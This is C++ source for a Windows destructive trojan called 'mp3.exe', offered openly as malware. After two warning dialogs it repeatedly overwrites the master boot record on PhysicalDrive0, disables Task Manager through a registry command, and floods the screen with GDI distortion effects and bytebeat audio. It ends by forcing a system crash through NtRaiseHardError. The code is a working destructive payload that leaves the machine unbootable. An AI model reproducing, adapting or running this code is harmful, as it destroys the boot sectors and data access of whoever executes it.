#include <windows.h>
#include <windowsx.h>
#include "bootrec.h"
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, *PRGBQUAD;

int red;
int green;
int blue;
bool ifblue = false;
COLORREF Hue(int length) {
     if (red != length) {
         red < length;
         red++;
         if (ifblue == true) {
             return RGB(red, 0, length);
         } else {
             return RGB(red, 0, 0);
         }
     } else {
         if (green != length) {
             green < length;
             green++;
             return RGB(length, green, 0);
         } else {
             if (blue != length) {
                 blue < length;
                 blue++;
                 return RGB(0, length, blue);
             } else {
                 red = 0;
                 green = 0;
                 blue = 0;
                 ifblue = true;
                 return 1;
             }
         }
     }
}

DWORD WINAPI mbr(LPVOID lpParam) {
    while(1) {
        DWORD dwBytesWritten;
        HANDLE hDisk = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            0, OPEN_EXISTING, 0, 0
        );
        WriteFile(hDisk, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDisk);
    }
}

DWORD WINAPI notaskmgr(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
}

DWORD WINAPI shader1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
         HDC hdc = GetDC(0);
         HDC hdcdc = CreateCompatibleDC(hdc);
         HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
         SelectObject(hdcdc, hbm);
         BitBlt(hdcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
         GetBitmapBits(hbm, w * h * 4, data);
         for (int i = 0; i < w * h; i++) {
              int x = i % w;
              int y = i / h;
              int t = y ^ y | x;
              data[i].rgb = RGB(GetRValue(Hue(239)), GetGValue(Hue(239)), GetBValue(Hue(239)));
         }
         SetBitmapBits(hbm, w * h * 4, data);
         BitBlt(hdc, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
         DeleteObject(hbm);
         DeleteObject(hdcdc);
         DeleteObject(hdc);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    while(1) {
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
        HPEN hPen = CreatePen(PS_SOLID, 5, Hue(239));
        SelectObject(hdc, hPen);
        PolyBezier(hdc, p, 4);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        int inc3 = rand() % 700;
        int v = rand() % 2;
        if (v == 1) inc3 = -700;
        inc3++;
        pt[0].x = rect.left - inc3;
        pt[0].y = rect.top + inc3;
        pt[1].x = rect.right - inc3;
        pt[1].y = rect.top - inc3;
        pt[2].x = rect.left + inc3;
        pt[2].y = rect.bottom - inc3;
        PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
        DeleteObject(brush);
        DeleteObject(hdcMem);
        DeleteObject(bm);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI balls(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while(1) {
        HDC hdc = GetDC(0);
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        x += incrementor * signX;
        y += incrementor * signY;
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN)) {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN)) {
            signX = -1;
        }

        if (y == 0) {
            signY = 1;
        }

        if (x == 0) {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader5(LPVOID lpParam) {
    while(1) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HPEN hPen = CreatePen(PS_SOLID, 2, RGB(Hue(239), Hue(239), Hue(239)));
        HPEN hOldPen = SelectPen(hdc, hPen);

        HBRUSH hBrush = CreateSolidBrush(Hue(239));
        HBRUSH hOldBrush = SelectBrush(hdc, hBrush);

        POINT vertices[] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));

        SelectBrush(hdc, hOldBrush);
        DeleteObject(hBrush);

        SelectPen(hdc, hOldPen);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(t&16384?6:5)*(3+(3&t>>(t&2048?7:14)))>>(3&t>>9)|t>>2);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(-t*(0xCA98CA98>>(-t>>9&30)&15)|-t>>8);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(t&16384?6:5)*(5-(3&t>>(t&4096?7:14)))>>(3&t>>9)|t>>3);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*t>>9|t*(t>>16)|t>>4);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t+(t&1)+(t>>5)*(t>>1)|t>>4|t>>8);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

int main() {
    if (MessageBoxW(NULL, L"WARNING: THIS APPLICATION YOU JUST RUNNING IS CONSIDERED A TROJAN HORSE THAT WILL CAUSE YOUR COMPUTER TO BECOME UNBOOTABLE!\nTHIS MEANS YOU CAN'T GO BACK TO THE OPERATING SYSTEM ONCE THE MBR IS DESTROYED!", L"mp3.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"LAST WARNING: ARE YOU SURE YOU WISH TO EXECUTE THIS?\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS TROJAN.", L"mp3.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, notaskmgr, 0, 0, 0);
            Sleep(4000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, balls, 0, 0, 0);
            sound5();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC000000D, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}
